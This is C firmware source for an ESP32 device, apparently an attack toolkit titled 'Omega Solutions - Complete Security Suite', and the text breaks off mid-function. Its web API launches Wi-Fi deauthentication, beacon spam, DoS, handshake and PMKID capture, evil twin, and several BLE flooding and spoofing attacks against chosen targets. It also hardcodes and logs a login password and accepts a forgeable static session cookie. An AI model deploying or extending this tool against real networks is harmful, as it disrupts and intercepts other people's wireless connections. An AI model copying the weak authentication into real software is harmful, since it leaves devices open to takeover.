//     ESP_LOGI(TAG, "Starting Handshake capture with method: %d", attack_config.method);
//     attack_handshake_start(&attack_config);
    
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t pmkid_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
    
//     if (!fill_ap_record_from_json(root, &pmkid_target, true)) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
//         return ESP_FAIL;
//     }
    
//     attack_config_t attack_config = {0};
//     attack_config.target_count = 1;
//     attack_config.ap_records[0] = &pmkid_target;
    
//     ESP_LOGI(TAG, "Starting PMKID attack");
//     attack_pmkid_start(&attack_config);
    
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t probe_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     ESP_LOGI(TAG, "Starting Probe Sniffer");
//     attack_probe_start(NULL);

//     return send_success_response(req);
// }

// static esp_err_t eviltwin_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
    
//     if (!fill_ap_record_from_json(root, &evil_twin_target, true)) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
//         return ESP_FAIL;
//     }
    
//     ESP_LOGI(TAG, "Starting Evil Twin attack on SSID: %s", evil_twin_target.ssid);
//     attack_method_evil_twin(&evil_twin_target);
    
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t stop_all_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     attack_timer_active = false;
//     stop_deauth_attack();
//     attack_beacon_spam_stop();
//     attack_dos_stop();
//     attack_handshake_stop();
//     attack_pmkid_stop();
//     attack_probe_stop();
//     attack_bt_spam_stop();
//     attack_method_evil_twin_stop();
//     ble_deauth_stop();
//     ble_connect_flood_stop();
//     ble_l2cap_stop();
//     ble_gatt_probe_stop();
//     ble_spoof_stop();

//     return send_success_response(req);
// }

// void start_web_server(void) {
//     httpd_handle_t server = NULL;
//     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
//     config.lru_purge_enable = true;
//     config.max_uri_handlers = 50;
    
//     if (httpd_start(&server, &config) == ESP_OK) {
//         server_handle = server;
//         // Register all URI handlers
//         httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = root_handler };
//         httpd_register_uri_handler(server, &root);
//         httpd_uri_t login = { .uri = "/login", .method = HTTP_GET, .handler = login_handler };
//         httpd_register_uri_handler(server, &login);
//         httpd_uri_t login_post = { .uri = "/login", .method = HTTP_POST, .handler = login_post_handler };
//         httpd_register_uri_handler(server, &login_post);
//         httpd_uri_t dashboard = { .uri = "/dashboard", .method = HTTP_GET, .handler = dashboard_handler };
//         httpd_register_uri_handler(server, &dashboard);
//         httpd_uri_t logout = { .uri = "/logout", .method = HTTP_GET, .handler = logout_handler };
//         httpd_register_uri_handler(server, &logout);
//         httpd_uri_t scan = { .uri = "/api/scan", .method = HTTP_GET, .handler = scan_api_handler };
//         httpd_register_uri_handler(server, &scan);
//         httpd_uri_t mgmt_ap_get = { .uri = "/api/mgmt-ap", .method = HTTP_GET, .handler = mgmt_ap_get_handler };
//         httpd_register_uri_handler(server, &mgmt_ap_get);
//         httpd_uri_t mgmt_ap_set = { .uri = "/api/mgmt-ap", .method = HTTP_POST, .handler = mgmt_ap_set_handler };
//         httpd_register_uri_handler(server, &mgmt_ap_set);
//         httpd_uri_t mgmt_ap_reset = { .uri = "/api/mgmt-ap/reset", .method = HTTP_POST, .handler = mgmt_ap_reset_handler };
//         httpd_register_uri_handler(server, &mgmt_ap_reset);
//         httpd_uri_t attack = { .uri = "/api/attack", .method = HTTP_POST, .handler = attack_api_handler };
//         httpd_register_uri_handler(server, &attack);
//         httpd_uri_t stop = { .uri = "/api/stop", .method = HTTP_POST, .handler = stop_api_handler };
//         httpd_register_uri_handler(server, &stop);
//         httpd_uri_t status = { .uri = "/api/status", .method = HTTP_GET, .handler = status_api_handler };
//         httpd_register_uri_handler(server, &status);
//         httpd_uri_t detector = { .uri = "/api/detector", .method = HTTP_GET, .handler = detector_api_handler };
//         httpd_register_uri_handler(server, &detector);
//         httpd_uri_t beacon_start = { .uri = "/api/beacon/start", .method = HTTP_POST, .handler = beacon_start_handler };
//         httpd_register_uri_handler(server, &beacon_start);
//         httpd_uri_t beacon_stop = { .uri = "/api/beacon/stop", .method = HTTP_POST, .handler = beacon_stop_handler };
//         httpd_register_uri_handler(server, &beacon_stop);
//         httpd_uri_t dos_start = { .uri = "/api/dos/start", .method = HTTP_POST, .handler = dos_start_handler };
//         httpd_register_uri_handler(server, &dos_start);
//         httpd_uri_t handshake_start = { .uri = "/api/handshake/start", .method = HTTP_POST, .handler = handshake_start_handler };
//         httpd_register_uri_handler(server, &handshake_start);
//         httpd_uri_t pmkid_start = { .uri = "/api/pmkid/start", .method = HTTP_POST, .handler = pmkid_start_handler };
//         httpd_register_uri_handler(server, &pmkid_start);
//         httpd_uri_t probe_start = { .uri = "/api/probe/start", .method = HTTP_POST, .handler = probe_start_handler };
//         httpd_register_uri_handler(server, &probe_start);
//         httpd_uri_t eviltwin_start = { .uri = "/api/eviltwin/start", .method = HTTP_POST, .handler = eviltwin_start_handler };
//         httpd_register_uri_handler(server, &eviltwin_start);
//         httpd_uri_t ble_scan_uri = { .uri = "/api/ble/scan", .method = HTTP_GET, .handler = ble_scan_api_handler };
//         httpd_register_uri_handler(server, &ble_scan_uri);
//         httpd_uri_t ble_status_uri = { .uri = "/api/ble/status", .method = HTTP_GET, .handler = ble_status_api_handler };
//         httpd_register_uri_handler(server, &ble_status_uri);
//         httpd_uri_t ble_spam_start_uri = { .uri = "/api/ble/spam/start", .method = HTTP_POST, .handler = ble_spam_start_handler };
//         httpd_register_uri_handler(server, &ble_spam_start_uri);
//         httpd_uri_t ble_spam_stop_uri = { .uri = "/api/ble/spam/stop", .method = HTTP_POST, .handler = ble_spam_stop_handler };
//         httpd_register_uri_handler(server, &ble_spam_stop_uri);
//         httpd_uri_t ble_spoof_start_uri = { .uri = "/api/ble/spoof/start", .method = HTTP_POST, .handler = ble_spoof_start_handler };
//         httpd_register_uri_handler(server, &ble_spoof_start_uri);
//         httpd_uri_t ble_spoof_stop_uri = { .uri = "/api/ble/spoof/stop", .method = HTTP_POST, .handler = ble_spoof_stop_handler };
//         httpd_register_uri_handler(server, &ble_spoof_stop_uri);
//         httpd_uri_t ble_connect_start_uri = { .uri = "/api/ble/connect/start", .method = HTTP_POST, .handler = ble_connect_start_handler };
//         httpd_register_uri_handler(server, &ble_connect_start_uri);
//         httpd_uri_t ble_connect_stop_uri = { .uri = "/api/ble/connect/stop", .method = HTTP_POST, .handler = ble_connect_stop_handler };
//         httpd_register_uri_handler(server, &ble_connect_stop_uri);
//         httpd_uri_t ble_l2cap_start_uri = { .uri = "/api/ble/l2cap/start", .method = HTTP_POST, .handler = ble_l2cap_start_handler };
//         httpd_register_uri_handler(server, &ble_l2cap_start_uri);
//         httpd_uri_t ble_l2cap_stop_uri = { .uri = "/api/ble/l2cap/stop", .method = HTTP_POST, .handler = ble_l2cap_stop_handler };
//         httpd_register_uri_handler(server, &ble_l2cap_stop_uri);
//         httpd_uri_t ble_gatt_start_uri = { .uri = "/api/ble/gatt/start", .method = HTTP_POST, .handler = ble_gatt_start_handler };
//         httpd_register_uri_handler(server, &ble_gatt_start_uri);
//         httpd_uri_t ble_gatt_stop_uri = { .uri = "/api/ble/gatt/stop", .method = HTTP_POST, .handler = ble_gatt_stop_handler };
//         httpd_register_uri_handler(server, &ble_gatt_stop_uri);
//         httpd_uri_t ble_deauth_start_uri = { .uri = "/api/ble/deauth/start", .method = HTTP_POST, .handler = ble_deauth_start_handler };
//         httpd_register_uri_handler(server, &ble_deauth_start_uri);
//         httpd_uri_t ble_deauth_stop_uri = { .uri = "/api/ble/deauth/stop", .method = HTTP_POST, .handler = ble_deauth_stop_handler };
//         httpd_register_uri_handler(server, &ble_deauth_stop_uri);
//         httpd_uri_t stop_all = { .uri = "/api/stop/all", .method = HTTP_POST, .handler = stop_all_handler };
//         httpd_register_uri_handler(server, &stop_all);
        
//         ESP_LOGI(TAG, "==========================================");
//         ESP_LOGI(TAG, "Omega Solutions - Complete Security Suite v4.0");
//         ESP_LOGI(TAG, "Web server started! Open http://192.168.4.1");
//         ESP_LOGI(TAG, "Username: omega | Password: solutions123");
//         ESP_LOGI(TAG, "Available Attacks: Deauth, Beacon, DoS, Handshake, PMKID, Probe, EvilTwin, BLE Spam, BLE Deauth");
//         ESP_LOGI(TAG, "==========================================");
//     }
// }

// void webserver_stop(void) {
//     if (server_handle != NULL) {
//         httpd_stop(server_handle);
//         server_handle = NULL;
//         ESP_LOGI(TAG, "Web server stopped.");
//     }
// }

// void webserver_run(void) {
//     if (server_handle == NULL) {
//         start_web_server();
//     }
// }



#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdbool.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_event.h"
#include "esp_http_server.h"
#include "cJSON.h"
#include "wifi_scanner.h"
#include "wifi_controller.h"
#include "attack_deauth.h"
#include "attack_deauth_detector.h"
#include "attack_beacon_spam.h"
#include "attack_dos.h"
#include "attack_handshake.h"
#include "attack_pmkid.h"
#include "attack_probe.h"
#include "attack_eviltwin.h"
#include "attack_bt_spam.h"
#include "bt/ble_scan.h"
#include "bt/ble_spoof.h"
#include "bt/ble_connect_flood.h"
#include "bt/ble_l2cap_flood.h"
#include "bt/ble_gatt_probe.h"
#include "bt/ble_deauth.h"
#include "attack.h"
#include "web_ui.h"
#include "ble_passkey.h"
#include "bt/ble_takeover.h"

static const char *TAG = "WEB_SERVER";
static httpd_handle_t server_handle = NULL;
static wifi_ap_record_t dos_target = {0};
static wifi_ap_record_t handshake_target = {0};
static wifi_ap_record_t pmkid_target = {0};
static wifi_ap_record_t evil_twin_target = {0};

ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);

#define USERNAME "omega"
#define PASSWORD "solutions123"

static int attack_duration_minutes = 0;
static time_t attack_start_time = 0;
static bool attack_timer_active = false;
static TaskHandle_t attack_timer_handle = NULL;

static bool session_cookie_is_authenticated(const char *cookie) {
    if (cookie == NULL) {
        return false;
    }

    const char expected[] = "session=authenticated";
    const size_t expected_len = sizeof(expected) - 1;

    while (*cookie != '\0') {
        while (*cookie == ' ' || *cookie == ';') {
            cookie++;
        }

        const char *end = strchr(cookie, ';');
        size_t len = end ? (size_t)(end - cookie) : strlen(cookie);
        while (len > 0 && cookie[len - 1] == ' ') {
            len--;
        }

        if (len == expected_len && strncmp(cookie, expected, expected_len) == 0) {
            return true;
        }

        if (end == NULL) {
            break;
        }
        cookie = end + 1;
    }

    return false;
}

static bool request_is_authenticated(httpd_req_t *req) {
    char cookie[100] = {0};
    if (httpd_req_get_hdr_value_str(req, "Cookie", cookie, sizeof(cookie)) != ESP_OK) {
        return false;
    }

    return session_cookie_is_authenticated(cookie);
}

static bool get_form_value(const char *content, const char *key, char *out, size_t out_size) {
    if (content == NULL || key == NULL || out == NULL || out_size == 0) {
        return false;
    }

    char marker[40];
    int marker_len = snprintf(marker, sizeof(marker), "%s=", key);
    if (marker_len <= 0 || (size_t)marker_len >= sizeof(marker)) {
        return false;
    }

    const char *value = strstr(content, marker);
    if (value == NULL) {
        return false;
    }
    value += marker_len;

    size_t len = strcspn(value, "&");
    if (len >= out_size) {
        len = out_size - 1;
    }

    memcpy(out, value, len);
    out[len] = '\0';

    char *src = out;
    char *dst = out;
    while (*src) {
        if (*src == '+') {
            *dst++ = ' ';
            src++;
            continue;
        }
        if (*src == '%' && src[1] && src[2]) {
            int hi = src[1];
            int lo = src[2];
            hi = (hi >= '0' && hi <= '9') ? (hi - '0') :
                 (hi >= 'a' && hi <= 'f') ? (hi - 'a' + 10) :
                 (hi >= 'A' && hi <= 'F') ? (hi - 'A' + 10) : -1;
            lo = (lo >= '0' && lo <= '9') ? (lo - '0') :
                 (lo >= 'a' && lo <= 'f') ? (lo - 'a' + 10) :
                 (lo >= 'A' && lo <= 'F') ? (lo - 'A' + 10) : -1;
            if (hi >= 0 && lo >= 0) {
                *dst++ = (char)((hi << 4) | lo);
                src += 3;
                continue;
            }
        }
        *dst++ = *src++;
    }
    *dst = '\0';
    while (dst > out && (dst[-1] == '\r' || dst[-1] == '\n' || dst[-1] == ' ' || dst[-1] == '\t')) {
        *--dst = '\0';
    }
    return true;
}

static bool parse_bssid(const char *value, uint8_t bssid[6]) {
    if (value == NULL || bssid == NULL) {
        return false;
    }

    unsigned int bytes[6];
    if (sscanf(value, "%2x:%2x:%2x:%2x:%2x:%2x",
               &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4], &bytes[5]) != 6) {
        return false;
    }

    for (size_t i = 0; i < 6; i++) {
        if (bytes[i] > 0xff) {
            return false;
        }
        bssid[i] = (uint8_t)bytes[i];
    }

    return true;
}

static bool fill_ap_record_from_json(cJSON *root, wifi_ap_record_t *record, bool require_ssid) {
    if (root == NULL || record == NULL) {
        return false;
    }

    cJSON *bssid_json = cJSON_GetObjectItem(root, "bssid");
    cJSON *channel_json = cJSON_GetObjectItem(root, "channel");
    cJSON *ssid_json = cJSON_GetObjectItem(root, "ssid");

    if (!cJSON_IsString(bssid_json) || !cJSON_IsNumber(channel_json)) {
        return false;
    }
    if (require_ssid && !cJSON_IsString(ssid_json)) {
        return false;
    }
    if (channel_json->valueint <= 0 || channel_json->valueint > 14) {
        return false;
    }

    memset(record, 0, sizeof(*record));
    if (!parse_bssid(bssid_json->valuestring, record->bssid)) {
        return false;
    }

    record->primary = (uint8_t)channel_json->valueint;
    if (cJSON_IsString(ssid_json) && ssid_json->valuestring != NULL) {
        strncpy((char *)record->ssid, ssid_json->valuestring, sizeof(record->ssid) - 1);
        record->ssid[sizeof(record->ssid) - 1] = '\0';
    }

    return true;
}

static esp_err_t send_json_response(httpd_req_t *req, cJSON *root) {
    if (root == NULL) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON allocation failed");
        return ESP_FAIL;
    }

    char *response = cJSON_PrintUnformatted(root);
    if (response == NULL) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON serialization failed");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    esp_err_t err = httpd_resp_send(req, response, strlen(response));
    cJSON_Delete(root);
    free(response);
    return err;
}

static esp_err_t send_success_response(httpd_req_t *req) {
    cJSON *response = cJSON_CreateObject();
    if (response != NULL) {
        cJSON_AddBoolToObject(response, "success", true);
    }
    return send_json_response(req, response);
}

static wifi_ap_record_t *scan_networks(size_t *ap_count) {
    if (ap_count == NULL) {
        return NULL;
    }

    scanner_scan();
    const wifictl_ap_records_t *records = scanner_get_records();
    if (records == NULL || records->count == 0) {
        *ap_count = 0;
        return NULL;
    }

    *ap_count = records->count;
    wifi_ap_record_t *copy = malloc(sizeof(wifi_ap_record_t) * records->count);
    if (copy == NULL) {
        return NULL;
    }

    memcpy(copy, records->records, sizeof(wifi_ap_record_t) * records->count);
    return copy;
}

static bool is_attack_active(void) {
    const attack_status_t *status = attack_get_status();
    return status && status->state == RUNNING;
}

static void get_attack_target(char *target) {
    if (target == NULL) {
        return;
    }

    const attack_status_t *status = attack_get_status();
    if (status == NULL || status->content == NULL || status->content_size == 0) {
        target[0] = '\0';
        return;
    }

    size_t len = status->content_size < 127 ? status->content_size : 127;
    memcpy(target, status->content, len);
    target[len] = '\0';
}

static void attack_timer_task(void *pvParameters) {
    while (attack_timer_active) {
        vTaskDelay(pdMS_TO_TICKS(1000));
        int remaining = (attack_duration_minutes * 60) - (time(NULL) - attack_start_time);
        if (remaining <= 0 && attack_duration_minutes > 0) {
            attack_timer_active = false;
            stop_deauth_attack();
            break;
        }
    }
    attack_timer_handle = NULL;
    vTaskDelete(NULL);
}

// ============ LOGIN HANDLERS ============
static esp_err_t login_post_handler(httpd_req_t *req) {
    char content[256] = {0};
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    
    char username[32] = {0}, password[32] = {0};
    get_form_value(content, "username", username, sizeof(username));
    get_form_value(content, "password", password, sizeof(password));
    
    if (strcmp(username, USERNAME) == 0 && strcmp(password, PASSWORD) == 0) {
        httpd_resp_set_hdr(req, "Set-Cookie", "session=authenticated; path=/");
        httpd_resp_set_hdr(req, "Location", "/dashboard");
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_send(req, "", 0);
    } else {
        httpd_resp_set_hdr(req, "Location", "/login?error=1");
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_send(req, "", 0);
    }
    return ESP_OK;
}

static esp_err_t dashboard_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_set_hdr(req, "Location", "/login");
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_send(req, "", 0);
        return ESP_OK;
    }
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, advanced_dashboard_html, strlen(advanced_dashboard_html));
    return ESP_OK;
}

static esp_err_t login_handler(httpd_req_t *req) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, advanced_login_html, strlen(advanced_login_html));
    return ESP_OK;
}

static esp_err_t logout_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Set-Cookie", "session=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT");
    httpd_resp_set_hdr(req, "Location", "/login");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_send(req, "", 0);
    return ESP_OK;
}

static esp_err_t root_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Location", "/login");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_send(req, "", 0);
    return ESP_OK;
}

// ============ API HANDLERS ============
static esp_err_t scan_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    size_t ap_count = 0;
    wifi_ap_record_t *ap_records = scan_networks(&ap_count);
    if (ap_records == NULL && ap_count > 0) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Scan failed");
        return ESP_FAIL;
    }
    cJSON *root = cJSON_CreateArray();
    if (root == NULL) {
        free(ap_records);
        return send_json_response(req, root);
    }
    for (size_t i = 0; i < ap_count; i++) {
        if (ap_records[i].ssid[0] == 0) continue;
        cJSON *network = cJSON_CreateObject();
        if (network == NULL) {
            free(ap_records);
            cJSON_Delete(root);
            return send_json_response(req, NULL);
        }
        cJSON_AddStringToObject(network, "ssid", (char*)ap_records[i].ssid);
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(ap_records[i].bssid));
        cJSON_AddStringToObject(network, "bssid", bssid_str);
        cJSON_AddNumberToObject(network, "channel", ap_records[i].primary);
        cJSON_AddNumberToObject(network, "rssi", ap_records[i].rssi);
        const char *auth = "Open";
        if (ap_records[i].authmode == WIFI_AUTH_WEP) auth = "WEP";
        else if (ap_records[i].authmode == WIFI_AUTH_WPA_PSK) auth = "WPA";
        else if (ap_records[i].authmode == WIFI_AUTH_WPA2_PSK) auth = "WPA2";
        else if (ap_records[i].authmode == WIFI_AUTH_WPA_WPA2_PSK) auth = "WPA/WPA2";
        cJSON_AddStringToObject(network, "authmode", auth);
        cJSON_AddItemToArray(root, network);
    }
    free(ap_records);
    return send_json_response(req, root);
}

static esp_err_t mgmt_ap_get_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char ssid[33] = {0};
    char pass[64] = {0};
    if (wifictl_mgmt_ap_get_creds(ssid, sizeof(ssid), pass, sizeof(pass)) != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to read AP config");
        return ESP_FAIL;
    }

    cJSON *root = cJSON_CreateObject();
    if (root != NULL) {
        cJSON_AddStringToObject(root, "ssid", ssid);
        cJSON_AddBoolToObject(root, "secured", strlen(pass) >= 8);
    }
    return send_json_response(req, root);
}

static esp_err_t mgmt_ap_set_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[256];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) {
        return ESP_FAIL;
    }
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *ssid_json = cJSON_GetObjectItem(root, "ssid");
    cJSON *pass_json = cJSON_GetObjectItem(root, "password");
    if (!cJSON_IsString(ssid_json) || !cJSON_IsString(pass_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing ssid/password");
        return ESP_FAIL;
    }

    esp_err_t err = wifictl_mgmt_ap_set_creds(ssid_json->valuestring, pass_json->valuestring);
    cJSON_Delete(root);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid SSID/password");
        return ESP_FAIL;
    }

    wifictl_mgmt_ap_stop();
    wifictl_mgmt_ap_start();
    return send_success_response(req);
}

static esp_err_t mgmt_ap_reset_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    if (wifictl_mgmt_ap_clear_creds() != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to clear AP config");
        return ESP_FAIL;
    }

    wifictl_mgmt_ap_stop();
    wifictl_mgmt_ap_start();
    return send_success_response(req);
}

static esp_err_t attack_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *bssid_json = cJSON_GetObjectItem(root, "bssid");
    cJSON *channel_json = cJSON_GetObjectItem(root, "channel");
    cJSON *minutes_json = cJSON_GetObjectItem(root, "minutes");
    
    if (!cJSON_IsString(bssid_json) || !cJSON_IsNumber(channel_json) ||
        channel_json->valueint <= 0 || channel_json->valueint > 14) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing bssid or channel");
        return ESP_FAIL;
    }
    
    uint8_t bssid[6];
    if (!parse_bssid(bssid_json->valuestring, bssid)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid bssid");
        return ESP_FAIL;
    }
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(bssid));
    
    start_deauth_attack(bssid_str, channel_json->valueint);
    
    if (cJSON_IsNumber(minutes_json) && minutes_json->valueint > 0) {
        attack_duration_minutes = minutes_json->valueint <= 999 ? minutes_json->valueint : 999;
        attack_start_time = time(NULL);
        attack_timer_active = true;
        if (attack_timer_handle == NULL) {
            xTaskCreate(attack_timer_task, "attack_timer", 2048, NULL, 5, &attack_timer_handle);
        }
    }
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t beacon_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[100];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    cJSON *mode_json = cJSON_GetObjectItem(root, "mode");
    cJSON *count_json = cJSON_GetObjectItem(root, "count");
    
    int mode = mode_json ? mode_json->valueint : 0;
    int count = count_json ? count_json->valueint : 50;
    
    attack_beacon_spam_start(count, mode);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t beacon_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_beacon_spam_stop();
    return send_success_response(req);
}

static esp_err_t ble_spam_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;

    cJSON *device_type_json = cJSON_GetObjectItem(root, "device_type");
    cJSON *delay_json = cJSON_GetObjectItem(root, "delay_ms");

    if (!cJSON_IsNumber(device_type_json) || !cJSON_IsNumber(delay_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "device_type and delay_ms are required");
        return ESP_FAIL;
    }

    int device_type = device_type_json->valueint;
    int delay_ms = delay_json->valueint;

    if (device_type < 1 || device_type > 25) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "device_type must be between 1 and 25");
        return ESP_FAIL;
    }
    if (delay_ms < 0 || delay_ms > 2000) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "delay_ms must be between 0 and 2000");
        return ESP_FAIL;
    }

    attack_bt_spam_init();

    bt_spam_config_t config = {0};
    config.device_type = device_type;
    config.delay_ms = delay_ms;
    attack_bt_spam_start(&config);

    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_spam_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_bt_spam_stop();
    return send_success_response(req);
}

static esp_err_t ble_spoof_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *name = cJSON_GetObjectItem(root, "name");
    const char *sname = cJSON_IsString(name) ? name->valuestring : NULL;
    ble_spoof_start(sname);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_spoof_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_spoof_stop();
    return send_success_response(req);
}

static esp_err_t ble_connect_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
    const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
    ble_connect_flood_start(saddr);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_connect_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_connect_flood_stop();
    return send_success_response(req);
}

static esp_err_t ble_l2cap_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *addr = cJSON_GetObjectItem(root, "addr");
